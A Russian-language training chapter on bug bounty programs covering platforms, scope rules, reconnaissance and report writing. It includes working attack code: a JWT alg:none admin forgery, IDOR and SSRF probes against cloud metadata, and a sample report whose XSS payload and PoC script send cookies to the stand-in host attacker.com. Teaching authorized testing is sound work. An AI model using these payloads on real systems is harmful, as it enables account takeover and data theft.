# Глава 15.2: Bug Bounty — программы, scope, методология

## 🎯 Цели главы

- Понять концепцию и экосистему Bug Bounty программ
- Научиться читать и анализировать scope программы
- Освоить методологию Bug Bounty: от разведки до репорта
- Изучить рейтинговые системы вознаграждений
- Узнать о ключевых платформах: HackerOne, Bugcrowd, Intigriti
- Познакомиться с реальными примерами успешных находок

---

## 15.2.1 Что такое Bug Bounty

### Определение и принцип работы

**Bug Bounty программа** — это официальная программа, в рамках которой компания предлагает денежное вознаграждение исследователям безопасности за ответственное раскрытие уязвимостей в своих продуктах.

```
КАК РАБОТАЕТ BUG BOUNTY:

 Компания                    Исследователь
┌──────────────┐            ┌──────────────┐
│  Публикует   │            │  Читает      │
│  программу   │◄───────────┤  scope,      │
│  с scope и   │            │  правила     │
│  выплатами   │            └──────────────┘
└──────────────┘                   │
       │                    Тестирует систему
       │                           │
       ▼                           ▼
┌──────────────┐            ┌──────────────┐
│  Получает    │            │  Находит     │
│  репорт,     │◄───────────┤  уязвимость  │
│  проверяет   │            │  и пишет     │
│  валидность  │            │  репорт      │
└──────────────┘            └──────────────┘
       │
       ▼
┌──────────────┐
│  Выплачивает │
│  вознаграж-  │
│  дение       │
└──────────────┘

Вознаграждения: от $0 (Hall of Fame) до $1,000,000+ за критические
```

### Размеры рынка Bug Bounty

```
СТАТИСТИКА (2024):

HackerOne платформа:
├── 3,000+ программ
├── $300M+ выплачено суммарно
├── 1,500+ исследователей зарабатывают >$10,000/год
├── Рекорд: $1,000,000 за уязвимость (Apple)
└── Средняя выплата за критическую: ~$3,000-15,000

Крупнейшие выплаты (публичные):
├── $1,000,000  — Apple (2020, boot-level exploit)
├── $200,000    — Google (Chrome RCE)
├── $150,000    — Facebook (account takeover)
├── $100,000    — Microsoft (RCE in Azure)
└── $85,000     — Apple (macOS privilege escalation)

Кто платит:
├── Google: до $31,337 за Chrome Bug
├── Apple: до $1,000,000
├── Microsoft: до $250,000 (Hyper-V)
├── Facebook/Meta: $500 минимум за любую находку
└── Bounty0x: агрегатор Web3 программ
```

### Типы Bug Bounty программ

```
ТИПЫ ПРОГРАММ:

PUBLIC (Открытые):
├── Любой исследователь может участвовать
├── Обычно менее эксклюзивные цели
└── Высокая конкуренция

PRIVATE (Закрытые):
├── Только приглашённые исследователи
├── Более интересные цели
├── Выше вознаграждения
└── Меньше конкуренции
→ Начинают как Public Hunter, затем приглашают Private

VDP (Vulnerability Disclosure Program):
├── Без денежного вознаграждения
├── Только Hall of Fame / Thank You
├── Хорошо для новичков и портфолио
└── Тренировка перед платными программами

Managed Bug Bounty:
└── Компания платит платформе, платформа координирует
    Примеры: HackerOne, Bugcrowd, Intigriti
```

---

## 15.2.2 Платформы Bug Bounty

### HackerOne

```
HackerOne (hackerone.com):

Крупнейшая платформа Bug Bounty в мире.

КЛИЕНТЫ: US Department of Defense, Uber, GitHub, Twitter,
          Yahoo, Shopify, Spotify, Slack и 2000+ других

ОСОБЕННОСТИ:
├── Hacktivity — публичная лента репортов
├── Hacker Leaderboard — рейтинг исследователей
├── Signal/Impact Score — метрики качества репортов
├── Hacker101 CTF — обучающий CTF для новичков
└── CTF → заработанные точки → Private инвайты

ПРОФИЛЬ ИССЛЕДОВАТЕЛЯ:
├── Reputation (репутация по репортам)
├── Signal (соотношение принятых к отклонённым)
├── Impact (взвешенные баллы по критичности)
└── Leaderboard position

УРОВНИ (как повысить до Private программ):
├── Новичок: проходи Hacker101 CTF
├── Начинающий: 10+ принятых репортов, Signal > 0.80
└── Опытный: Top 100 в leaderboard
```

### Bugcrowd

```
Bugcrowd (bugcrowd.com):

Вторая по размеру платформа.

КЛИЕНТЫ: Tesla, NetSuite, Mastercard, Fitbit, Square

ОСОБЕННОСТИ:
├── Crowdstream — лента активности
├── Priority (P1-P5) вместо CVSS
├── Researcher Trust Level (1-5)
├── CrowdControl — bug tracking
└── Managed Bug Bounty сервис

PRIORITY LEVELS:
P1 (Critical): RCE, SQLi с данными, Account Takeover критичный
P2 (High): Auth bypass, Stored XSS
P3 (Medium): CSRF, Reflected XSS
P4 (Low): Self-XSS, Rate limit
P5 (Informational): Лучшие практики

BUGCROWD UNIVERSITY:
└── Бесплатные обучающие материалы на bugcrowd.com/university
```

### Intigriti

```
Intigriti (intigriti.com):

Европейская платформа, растущая быстро.

КЛИЕНТЫ: Mostly European companies, Europol, NATO

ОСОБЕННОСТИ:
├── Хорошо для европейских компаний (GDPR)
├── Меньше конкуренции чем HackerOne
├── Быстрые выплаты
└── 0bug — образовательный ресурс

ОСОБЕННОСТИ ДЛЯ НАЧИНАЮЩИХ:
└── Регулярные "Bug Bounty Fridays" — специальные события
    с увеличенными выплатами для новичков
```

### Другие платформы

```
ДОПОЛНИТЕЛЬНЫЕ ПЛАТФОРМЫ:

Yeswehack (yeswehack.com):
└── Европейский конкурент Intigriti

Synack (synack.com):
└── Только приглашённые, строгий отбор
└── Самые эксклюзивные программы

Open Bug Bounty (openbugbounty.org):
└── Только XSS, только координированное раскрытие
└── Без денег (репутация)

Cobalt (cobalt.io):
└── Pentest as a Service + Bug Bounty
└── Фиксированные $150/час для отобранных

Topcoder Bug Hunt:
└── Более структурированные программы

Hackenproof (hackenproof.com):
└── Web3 / blockchain фокус

Immunefi (immunefi.com):
└── Только Web3 / DeFi / Smart contracts
└── Выплаты в крипто
└── Рекорд: $10,000,000 за Wormhole exploit
```

---

## 15.2.3 Понимание Scope

**Scope (область действия)** — это самый важный документ Bug Bounty программы. Определяет что можно и что нельзя тестировать.

### Анатомия scope документа

```markdown
# ПРИМЕР SCOPE ДОКУМЕНТА (HackerOne — Shopify)

## In-Scope Assets (что тестировать)

### Web Application
- *.shopify.com
- *.myshopify.com
- *.shopifycloud.com (except listed exclusions)
- Shopify iOS App (com.jadedpixel.jaded)
- Shopify Android App (com.shopify.mobile)

### APIs
- shopify.dev/api/
- REST Admin API
- GraphQL API

## Out-of-Scope (что НЕ тестировать ← КРИТИЧЕСКИ ВАЖНО)

### Systems
- *.shopifystatus.com (мониторинг)
- cdn.shopify.com (CDN — только чтение)
- Third-party integrations (Stripe, PayPal — чужие системы!)
- apps.shopify.com hosted apps (партнёрские приложения)

### Vulnerability Types (out of scope по типу)
- Social engineering (фишинг сотрудников)
- Physical attacks
- DoS/DDoS attacks
- Automated scanning without prior approval
- Reported by automated tools without manual verification
- SPF/DMARC issues (без PoC)
- Clickjacking без sensitive функциональности

## Правила тестирования
- Создавай только тестовые аккаунты
- Не получай доступ к данным других пользователей
- Не влияй на production доступность
- Репорти только одну уязвимость за раз (no batch)
- Safe Harbor: мы не будем преследовать за добросовестное тестирование
```

### Анализ scope — критические навыки

```python
#!/usr/bin/env python3
"""
scope_analyzer.py
Помогает анализировать scope и генерировать список targets
"""

import re
import urllib.parse

class ScopeAnalyzer:
    def __init__(self, in_scope: list, out_of_scope: list):
        self.in_scope = in_scope
        self.out_of_scope = out_of_scope

    def is_in_scope(self, target: str) -> bool:
        """
        Проверяет, входит ли target в scope
        Учитывает wildcard (*.example.com)
        """
        # Сначала проверяем out-of-scope (приоритет!)
        for oos in self.out_of_scope:
            if self._matches(target, oos):
                return False

        # Затем in-scope
        for scope in self.in_scope:
            if self._matches(target, scope):
                return True

        return False

    def _matches(self, target: str, pattern: str) -> bool:
        """Проверка совпадения с шаблоном (поддержка *)"""
        # Нормализация
        target = target.lower().strip()
        pattern = pattern.lower().strip()

        # Wildcard субдомен: *.example.com
        if pattern.startswith("*."):
            base_domain = pattern[2:]  # example.com
            return target.endswith(f".{base_domain}") or target == base_domain

        # Прямое совпадение
        return target == pattern

    def filter_targets(self, targets: list) -> dict:
        """Разделяет список целей на in-scope и out-of-scope"""
        result = {"in_scope": [], "out_of_scope": [], "uncertain": []}

        for target in targets:
            if self.is_in_scope(target):
                result["in_scope"].append(target)
            else:
                result["out_of_scope"].append(target)

        return result

    def expand_wildcards(self) -> list:
        """
        Возвращает подсказки по расширению wildcard targets
        Нужно использовать subdomain enumeration
        """
        suggestions = []
        for scope in self.in_scope:
            if scope.startswith("*."):
                base = scope[2:]
                suggestions.append(f"Run: subfinder -d {base} -o subdomains.txt")
                suggestions.append(f"Run: amass enum -d {base} -o subdomains.txt")
                suggestions.append(f"Run: assetfinder {base} >> subdomains.txt")
        return suggestions

# Пример использования
shopify_scope = ScopeAnalyzer(
    in_scope=["*.shopify.com", "*.myshopify.com", "shopify.dev"],
    out_of_scope=["*.shopifystatus.com", "cdn.shopify.com"]
)

# Проверяем список поднайденных поддоменов
found_subdomains = [
    "admin.shopify.com",
    "cdn.shopify.com",          # Out of scope!
    "shopifystatus.com",         # Out of scope!
    "api.shopify.com",
    "accounts.shopify.com",
    "developers.shopify.com",
    "randomsite.com"             # Not in scope
]

result = shopify_scope.filter_targets(found_subdomains)
print("IN SCOPE:")
for target in result["in_scope"]:
    print(f"  ✅ {target}")

print("\nOUT OF SCOPE:")
for target in result["out_of_scope"]:
    print(f"  ❌ {target}")

# Подсказки для расширения
print("\nSUBDOMAIN ENUM COMMANDS:")
for cmd in shopify_scope.expand_wildcards():
    print(f"  {cmd}")
```

### Типичные ошибки со scope

```
КРИТИЧЕСКИЕ ОШИБКИ НОВИЧКОВ:

❌ НАРУШЕНИЕ SCOPE — Последствия:
   • Репорт отклонён как N/A (not applicable)
   • Бан на платформе
   • Юридическое преследование
   • Потеря репутации навсегда

ЧАСТЫЕ ОШИБКИ:

1. Тестирование out-of-scope субдоменов
   Пример: programm говорит *.example.com, ты тестируешь
   partner.example.com который НЕ является their service

2. Тестирование third-party
   Shopify использует Stripe для платежей —
   Stripe НЕ входит в scope Shopify!

3. DoS/DDoS без явного разрешения
   Почти всегда запрещено.

4. Social engineering сотрудников
   Фишинг сотрудников компании = вне scope.

5. Агрессивное автоматическое сканирование
   Burp Active Scanner / sqlmap без явного разрешения
   часто нарушает правила.

6. Тестирование данных реальных пользователей
   Нашёл SQLi? Достал 1 строку как PoC — и всё!
   Не качай всю базу данных.
```

---

## 15.2.4 Методология Bug Bounty

### Общий процесс

```
МЕТОДОЛОГИЯ BUG BOUNTY:

┌─────────────────────────────────────────────────────────┐
│                  BUG BOUNTY WORKFLOW                    │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. ВЫБОР ПРОГРАММЫ                                     │
│     └── Анализ scope, выплат, конкуренции              │
│                                                         │
│  2. РАЗВЕДКА (Reconnaissance)                           │
│     ├── Subdomain enumeration                           │
│     ├── Port scanning                                   │
│     ├── Technology fingerprinting                       │
│     ├── GitHub/Google dorks                             │
│     └── Historical data (Wayback Machine, VirusTotal)  │
│                                                         │
│  3. ПОНИМАНИЕ ПРИЛОЖЕНИЯ                               │
│     ├── Manual browsing всех функций                    │
│     ├── Burp Spider                                     │
│     ├── Поиск API endpoints                             │
│     └── Изучение JS файлов                             │
│                                                         │
│  4. ТЕСТИРОВАНИЕ ПО ПРИОРИТЕТАМ                        │
│     ├── Аутентификация и авторизация (высокий выход)   │
│     ├── Функции с данными                               │
│     ├── Файловые операции                               │
│     └── Менее очевидные функции                         │
│                                                         │
│  5. НАШЁЛ УЯЗВИМОСТЬ                                   │
│     ├── Verify (убедиться, что real bug)               │
│     ├── Assess Impact (какой реальный ущерб)           │
│     └── Document (PoC, шаги воспроизведения)           │
│                                                         │
│  6. РЕПОРТ                                              │
│     ├── Качественное описание                           │
│     ├── Точные шаги воспроизведения                    │
│     ├── Video/Screenshot PoC                            │
│     └── Рекомендация по исправлению                    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Шаг 1: Выбор программы

```
КАК ВЫБРАТЬ ПРОГРАММУ (НОВИЧКУ):

ДЛЯ СТАРТА:
✓ Открытые программы (не Private)
✓ Широкий scope (*.example.com vs example.com/app только)
✓ Активная программа (недавние репорты в Hacktivity)
✓ Хорошая репутация на среднее время ответа
✓ Молодые программы (меньше кто уже нашёл)

ИЗБЕГАТЬ НОВИЧКУ:
✗ Программы только с Hall of Fame (нет денег)
✗ Программы с долгим response time (>14 дней)
✗ Уже очень популярные программы (всё найдено)
✗ Очень узкий scope (только /app/login)

МЕТРИКИ HackerOne ПРОГРАММЫ:
├── Average Bounty: средняя выплата
├── Average Response Time: среднее время ответа
├── Resolved: количество закрытых репортов
└── Disclosed: публично раскрытые репорты (можно изучать!)
```

### Шаг 2: Разведка (Reconnaissance)

```bash
#!/bin/bash
# bb_recon.sh — автоматизированная разведка для Bug Bounty

TARGET_DOMAIN="example.com"
OUTPUT_DIR="./recon/$TARGET_DOMAIN"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting recon for $TARGET_DOMAIN"
echo "[*] Output dir: $OUTPUT_DIR"

# 1. SUBDOMAIN ENUMERATION
echo "[+] Finding subdomains..."

# Пассивное перечисление
subfinder -d "$TARGET_DOMAIN" -o "$OUTPUT_DIR/subfinder.txt" 2>/dev/null
amass enum -passive -d "$TARGET_DOMAIN" -o "$OUTPUT_DIR/amass.txt" 2>/dev/null
assetfinder "$TARGET_DOMAIN" > "$OUTPUT_DIR/assetfinder.txt" 2>/dev/null

# Слияние и дедупликация
cat "$OUTPUT_DIR/subfinder.txt" \
    "$OUTPUT_DIR/amass.txt" \
    "$OUTPUT_DIR/assetfinder.txt" | \
    sort -u > "$OUTPUT_DIR/all_subdomains.txt"

echo "[*] Found $(wc -l < "$OUTPUT_DIR/all_subdomains.txt") unique subdomains"

# 2. LIVE HOST DISCOVERY
echo "[+] Checking which subdomains are alive..."
httpx -l "$OUTPUT_DIR/all_subdomains.txt" \
      -o "$OUTPUT_DIR/live_hosts.txt" \
      -status-code -title -tech-detect \
      -threads 50

echo "[*] $(wc -l < "$OUTPUT_DIR/live_hosts.txt") live hosts found"

# 3. PORT SCANNING (только живые хосты, только основные порты)
echo "[+] Port scanning..."
cat "$OUTPUT_DIR/live_hosts.txt" | \
    awk '{print $1}' | \
    sed 's|https\?://||' | \
    sort -u > "$OUTPUT_DIR/live_domains.txt"

nmap -iL "$OUTPUT_DIR/live_domains.txt" \
     --top-ports 1000 \
     -T4 \
     -oN "$OUTPUT_DIR/nmap.txt" \
     2>/dev/null

# 4. TECHNOLOGY FINGERPRINTING
echo "[+] Detecting technologies..."
whatweb --input-file="$OUTPUT_DIR/live_hosts.txt" \
        --log-brief="$OUTPUT_DIR/technologies.txt" \
        2>/dev/null

# 5. ENDPOINT DISCOVERY (JavaScript анализ)
echo "[+] Extracting URLs from JS..."
cat "$OUTPUT_DIR/live_hosts.txt" | \
    awk '{print $1}' | \
    gau --threads 5 > "$OUTPUT_DIR/gau_urls.txt"  # GetAllURLs

# JS endpoints
katana -list "$OUTPUT_DIR/live_hosts.txt" \
       -jc \
       -d 3 \
       -o "$OUTPUT_DIR/katana_endpoints.txt"

# 6. GOOGLE DORKS
echo "[+] Google dork results (manual):"
echo "  site:$TARGET_DOMAIN filetype:pdf"
echo "  site:$TARGET_DOMAIN inurl:api"
echo "  site:$TARGET_DOMAIN ext:env OR ext:config"
echo "  site:$TARGET_DOMAIN 'internal use only'"

# 7. GITHUB ДОРКИ
echo "[+] Check GitHub for leaks:"
echo "  github.com/search?q=$TARGET_DOMAIN&type=code"
echo "  Look for: API keys, credentials, endpoints"

# 8. WAYBACK MACHINE
echo "[+] Historical URLs..."
waybackurls "$TARGET_DOMAIN" > "$OUTPUT_DIR/wayback.txt"
# Ищем старые endpoints, backup файлы

echo "[+] Recon complete! Results in $OUTPUT_DIR"
echo "[*] Summary:"
echo "  Subdomains: $(wc -l < "$OUTPUT_DIR/all_subdomains.txt")"
echo "  Live hosts: $(wc -l < "$OUTPUT_DIR/live_hosts.txt")"
echo "  URLs found: $(wc -l < "$OUTPUT_DIR/wayback.txt")"
```

### Шаг 3: Приоритизация функциональности

```
ЧТО ТЕСТИРОВАТЬ ПЕРВЫМ (по потенциальному выходу):

ВЫСОКИЙ ПРИОРИТЕТ:
├── Аутентификация / Авторизация
│   ├── Login/Register/Reset Password
│   ├── OAuth flows
│   ├── JWT/Session управление
│   └── MFA механизмы
│
├── Загрузка файлов
│   └── Потенциально RCE или Stored XSS
│
├── API endpoints
│   ├── Неаутентифицированный доступ к данным (IDOR)
│   └── Отсутствие авторизации на методы
│
├── Любые операции с деньгами
│   └── Race conditions, integer overflow
│
└── Административные функции
    └── Privilege escalation

СРЕДНИЙ ПРИОРИТЕТ:
├── Поиск/Фильтрация (SQLi)
├── Формы отзывов/комментариев (Stored XSS)
├── URL параметры (Reflected XSS, SSRF)
└── Экспорт данных (IDOR, path traversal)

НИЗКИЙ ПРИОРИТЕТ:
├── Информационное раскрытие
├── Заголовки (security headers)
└── Проблемы без реального PoC
```

### Шаг 4: Тестирование — эффективные техники

```python
#!/usr/bin/env python3
"""
bb_automation.py — автоматизированное тестирование
для Bug Bounty
"""

import requests
import json
import re
from urllib.parse import urljoin, urlparse

class BBTester:
    def __init__(self, base_url: str, session: requests.Session = None):
        self.base_url = base_url
        self.session = session or requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; security-research/1.0)"
        })

    def test_idor(self, endpoint: str, param: str, your_id: int, test_ids: list):
        """
        Тест IDOR (Insecure Direct Object Reference)
        Пример: /api/user/{id}/profile
        Твой ID: 1000, Тестируем: 999, 1001, 1234
        """
        results = []
        your_response = self.session.get(f"{self.base_url}{endpoint}".replace("{id}", str(your_id)))

        for test_id in test_ids:
            url = f"{self.base_url}{endpoint}".replace("{id}", str(test_id))
            resp = self.session.get(url)

            result = {
                "id": test_id,
                "status": resp.status_code,
                "size": len(resp.text),
                "vuln": False
            }

            # IDOR обнаружен если:
            # 1. Получаем 200 (не 403/404)
            # 2. Ответ отличается от нашего профиля
            if resp.status_code == 200 and resp.text != your_response.text:
                result["vuln"] = True
                result["data_snippet"] = resp.text[:200]
                print(f"[!] POTENTIAL IDOR! ID {test_id}: {url}")

            results.append(result)

        return results

    def test_jwt_attacks(self, jwt_token: str, endpoint: str):
        """
        Базовые атаки на JWT
        """
        import base64

        results = {}

        # Декодируем (без проверки подписи)
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return {"error": "Not a valid JWT"}

        # Декодируем header и payload
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

        print(f"[*] JWT Header: {json.dumps(header, indent=2)}")
        print(f"[*] JWT Payload: {json.dumps(payload, indent=2)}")

        # Атака 1: alg:none
        none_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()

        # Меняем роль на admin
        admin_payload = payload.copy()
        if "role" in admin_payload:
            admin_payload["role"] = "admin"
        if "admin" in admin_payload:
            admin_payload["admin"] = True

        none_payload = base64.urlsafe_b64encode(
            json.dumps(admin_payload).encode()
        ).rstrip(b"=").decode()

        none_token = f"{none_header}.{none_payload}."

        resp = self.session.get(
            f"{self.base_url}{endpoint}",
            headers={"Authorization": f"Bearer {none_token}"}
        )

        results["alg_none"] = {
            "token": none_token,
            "status": resp.status_code,
            "vuln": resp.status_code == 200 and "admin" in resp.text.lower()
        }

        if results["alg_none"]["vuln"]:
            print(f"[!] JWT alg:none vulnerability found!")

        return results

    def find_hidden_endpoints(self, wordlist_file: str = None):
        """
        Поиск скрытых endpoint через fuzzing
        """
        common_endpoints = [
            "/api/admin", "/api/users", "/api/debug",
            "/admin", "/administrator", "/.env", "/.git/HEAD",
            "/api/v1/users", "/api/v2/users",
            "/backup", "/config", "/test",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/graphql", "/graphiql",
        ]

        found = []
        for endpoint in common_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = self.session.get(url, timeout=5, allow_redirects=False)
                if resp.status_code not in [404, 410]:
                    print(f"[+] Found: {url} [{resp.status_code}]")
                    found.append({
                        "url": url,
                        "status": resp.status_code,
                        "size": len(resp.text)
                    })
            except requests.exceptions.RequestException:
                pass

        return found

    def test_ssrf(self, param_url: str, ssrf_targets: list = None):
        """
        Тест SSRF в параметре URL
        """
        if ssrf_targets is None:
            ssrf_targets = [
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://metadata.google.internal/",           # GCP metadata
                "http://169.254.169.254/metadata/v1/",        # DigitalOcean
                "http://localhost/",
                "http://127.0.0.1/",
                "http://0.0.0.0/",
                "http://[::1]/",
            ]

        results = []
        for target in ssrf_targets:
            # Формируем запрос с SSRF payload
            resp = self.session.get(
                param_url,
                params={"url": target},
                timeout=10
            )

            result = {
                "target": target,
                "status": resp.status_code,
                "size": len(resp.text),
                "vuln": False
            }

            # Признаки SSRF: данные metadata в ответе
            if any(keyword in resp.text.lower() for keyword in
                   ["ami-id", "instance-id", "ec2", "compute", "metadata"]):
                result["vuln"] = True
                print(f"[!] SSRF CONFIRMED! Target: {target}")
                print(f"    Response snippet: {resp.text[:200]}")

            results.append(result)

        return results

# Пример использования
if __name__ == "__main__":
    tester = BBTester("https://target.example.com")

    # Логинимся
    tester.session.post("/login", data={
        "username": "your_test_account",
        "password": "your_password"
    })

    # Тест IDOR на профили
    idor_results = tester.test_idor(
        endpoint="/api/user/{id}/profile",
        param="id",
        your_id=12345,
        test_ids=[1, 2, 100, 12344, 12346, 99999]
    )

    # Поиск скрытых endpoint
    hidden = tester.find_hidden_endpoints()
```

---

## 15.2.5 Написание репорта

### Структура хорошего репорта

```markdown
# ШАБЛОН BUG BOUNTY РЕПОРТА

## Title (Заголовок)
[CVSS Score] Тип уязвимости в Компоненте — краткое описание impact

Пример:
[7.5 High] Stored XSS in User Profile → Account Takeover
[9.8 Critical] SQLi in /api/products/search → Database dump
[8.3 High] IDOR in /api/orders/{id} → Access to other users' orders

## Severity
Critical / High / Medium / Low / Informational

## Asset
Какой конкретно URL/endpoint уязвим:
https://app.example.com/api/v1/users/profile/update

## Description (Описание)
Краткое, чёткое описание уязвимости:

Параметр `bio` в форме редактирования профиля не экранирует
введённые данные перед их сохранением в базе данных и
последующим отображением другим пользователям. Это позволяет
атакующему внедрить вредоносный JavaScript код, который
выполнится в браузере любого пользователя, просмотревшего
профиль жертвы.

## Steps to Reproduce (Шаги воспроизведения — САМОЕ ВАЖНОЕ!)

1. Создайте аккаунт: attacker@test.com (или используйте существующий)
2. Перейдите на: https://app.example.com/profile/edit
3. В поле "Bio" введите следующий payload:
   ```
   <script>document.location='https://attacker.com/?c='+document.cookie</script>
   ```
4. Нажмите "Save Profile"
5. Откройте профиль атакующего под другим аккаунтом (victim@test.com):
   https://app.example.com/user/attacker
6. Наблюдайте: в браузере жертвы выполняется JavaScript,
   cookies жертвы отправляются на attacker.com

[ВСТАВИТЬ ВИДЕО или SCREENSHOT]

## Impact (Влияние)
Детальное описание что может сделать злоумышленник:

Злоумышленник может:
1. Похитить session cookie жертвы → полный захват аккаунта
2. Перенаправить жертву на фишинговую страницу
3. Выполнить действия от имени жертвы (отправить деньги, изменить email)
4. Атака масштабируется на всех пользователей, просматривающих профиль

При использовании как worm (self-replicating XSS) может
скомпрометировать тысячи аккаунтов.

## Proof of Concept

```python
# PoC скрипт
import requests

TARGET = "https://app.example.com"
XSS_PAYLOAD = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"

# 1. Логин
session = requests.Session()
session.post(f"{TARGET}/login", data={
    "email": "attacker@test.com",
    "password": "test123"
})

# 2. Внедрение payload
resp = session.post(f"{TARGET}/profile/edit", data={
    "bio": XSS_PAYLOAD,
    "name": "Attacker"
})

print(f"Profile update: {resp.status_code}")
print(f"XSS payload injected. Visit: {TARGET}/user/attacker to trigger.")
```

## Suggested Fix (Предложение по исправлению)

Необходимо применить HTML encoding к пользовательским данным
перед их отображением:

PHP пример:
```php
// Вместо:
echo $user->bio;

// Использовать:
echo htmlspecialchars($user->bio, ENT_QUOTES, 'UTF-8');
```

Также рекомендуется:
- Внедрить Content Security Policy (CSP)
- Использовать HTTPOnly флаг для cookies
- Реализовать X-XSS-Protection заголовок
```

### Советы по качественным репортам

```
КАЧЕСТВО РЕПОРТА = РАЗМЕР ВЫПЛАТЫ + РЕПУТАЦИЯ

✓ ЧТО ДЕЛАЕТ РЕПОРТ ХОРОШИМ:

1. Чёткий, воспроизводимый PoC
   "Скопируй это → вставь туда → нажми кнопку → вот результат"

2. Реальный impact
   Не "теоретически возможно", а "вот что реально можно сделать"

3. Видео PoC (очень ценится!)
   Запись экрана с воспроизведением уязвимости

4. Правильная оценка severity
   Не завышай (теряешь репутацию) и не занижай

5. Рекомендации по исправлению
   Показывает экспертизу, ускоряет fixes

✗ ЧТО ДЕЛАЕТ РЕПОРТ ПЛОХИМ:

1. Нет шагов воспроизведения ("смотрите скриншот")
2. Нереалистичный impact ("теоретически можно взломать всё")
3. Duplicate (уже известная уязвимость)
4. Out of scope (нарушение правил)
5. Слишком общий ("сайт уязвим к XSS" без конкретики)
6. Автоматический scan без manual verification
7. Self-XSS (только ты сам можешь триггернуть)

RESPONSE TIME ЭТИКА:
├── 24 часа для P1/Critical
├── 72 часа для P2/High
├── 7 дней для остальных
└── Не беспокой triager чаще чем раз в 7 дней
```

---

## 15.2.6 Типичные находки в Bug Bounty

### High/Critical уязвимости с хорошим выходом

```
ТОП НАХОДОК ДЛЯ BUG BOUNTY:

1. IDOR (Insecure Direct Object Reference)
   Почему часто: в каждом приложении есть объекты
   Где искать: /api/orders/123, /download?file_id=456
   Impact: доступ к чужим данным
   Типичная выплата: $500 - $5,000

2. Authentication Bypass
   Где: login, reset password, OAuth
   Impact: полный захват аккаунта
   Типичная выплата: $3,000 - $20,000

3. Server-Side Request Forgery (SSRF)
   Где: функции загрузки URL, preview, fetch
   Impact: доступ к internal сервисам, metadata API
   Типичная выплата: $1,000 - $10,000

4. Stored XSS
   Где: комментарии, имена, профили
   Impact: Account takeover пользователей
   Типичная выплата: $500 - $5,000

5. SQL Injection
   Где: поиск, фильтры, параметры
   Impact: извлечение данных, обход auth
   Типичная выплата: $3,000 - $25,000+

6. Business Logic Flaws
   Где: корзина, промокоды, подписки
   Impact: финансовый ущерб
   Типичная выплата: $500 - $10,000+
   Пример: купон на -100% → бесплатная покупка

7. Race Conditions
   Где: транзакции, лайки, ограниченные действия
   Impact: двойное списание, бесплатные кредиты
   Типичная выплата: $500 - $5,000

8. Subdomain Takeover
   Где: удалённые CNAME → внешние сервисы
   Impact: фишинг, XSS на основном домене
   Типичная выплата: $200 - $2,000
```

### Инструменты специфичные для Bug Bounty

```bash
# ИНСТРУМЕНТАРИЙ BUG BOUNTY ОХОТНИКА:

# Разведка
subfinder -d target.com          # Субдомены
amass enum -d target.com         # Субдомены (более мощный)
httpx -l hosts.txt               # Живые хосты
gau target.com                   # Все исторические URL
waybackurls target.com           # Wayback Machine URLs
github-search target.com         # Утечки на GitHub

# Обнаружение
feroxbuster -u https://target.com # Directory fuzzing
ffuf -u https://target.com/FUZZ  # Универсальный fuzzer
nuclei -u target.com -t cves/    # CVE проверки
dalfox url "target.com/?q=test"  # XSS сканер
sqlmap -u "target.com/?id=1"     # SQLi сканер

# Анализ
gf xss urls.txt                  # Фильтр XSS-уязвимых параметров
gf sqli urls.txt                 # Фильтр SQLi параметров
qsreplace FUZZ < urls.txt        # Замена параметров на FUZZ

# SSRF
ssrfmap -u "target.com?url=SSRF" # SSRF тест

# Subdomain Takeover
subjack -w subdomains.txt        # Проверка subdomain takeover
nuclei -t takeovers/             # Nuclei templates для takeover

# Специфические
corsy -i subdomains.txt          # CORS misconfiguration
cors-scanner                     # CORS тестирование
jwt_tool -t TOKEN -M at          # JWT атаки
```

---

## 📌 Итоги главы

- Bug Bounty — легальный и прибыльный способ применить навыки пентеста
- Ключевые платформы: HackerOne, Bugcrowd, Intigriti; для Web3 — Immunefi
- **Scope** — самое важное: нарушение = бан + юридический риск
- Методология: программа → разведка → понимание → тестирование → репорт
- Хороший репорт = чёткий PoC + реальный impact + шаги воспроизведения + видео
- Лучший ROI: IDOR, Auth Bypass, SSRF, Stored XSS, Business Logic
- Новичку: начать с VDP и открытых программ, строить репутацию, получить Private инвайты

---

## 🏠 Домашнее задание

1. **Базовый уровень:** Зарегистрируйтесь на HackerOne. Найдите 3 программы с широким scope и хорошей репутацией. Прочитайте их scope документы и составьте список "In-Scope" и "Out-of-Scope" для каждой.

2. **Средний уровень:** Пройдите Hacker101 CTF (hacker101.com/ctf) — решите все Easy и Medium задачи. Это даёт инвайты в Private программы.

3. **Продвинутый уровень:** Найдите публично раскрытый репорт на HackerOne (hackerone.com/hacktivity) с оценкой High или Critical, изучите его структуру и попробуйте воспроизвести уязвимость на аналогичном приложении (DVWA, Juice Shop).

4. **Практика разведки:** Выберите любую открытую Bug Bounty программу и проведите разведку: найдите субдомены, живые хосты, endpoints. Не тестируй уязвимости — только разведка. Документируй результаты.

---

## 🔗 Полезные ресурсы

| Ресурс | URL | Описание |
|--------|-----|----------|
| HackerOne | hackerone.com | Платформа Bug Bounty #1 |
| Bugcrowd | bugcrowd.com | Платформа Bug Bounty #2 |
| Intigriti | intigriti.com | Европейская платформа |
| Hacker101 | hacker101.com | Обучение + CTF от HackerOne |
| Bugcrowd University | bugcrowd.com/university | Бесплатное обучение |
| NAHAMSEC Resources | github.com/nahamsec | Ресурсы Bug Bounty |
| Jason Haddix | github.com/jhaddix | Методологии пентестера |
| tomnomnom tools | github.com/tomnomnom | Инструменты для BB |
| projectdiscovery | github.com/projectdiscovery | nuclei, subfinder, httpx |
| Immunefi | immunefi.com | Web3 Bug Bounty |
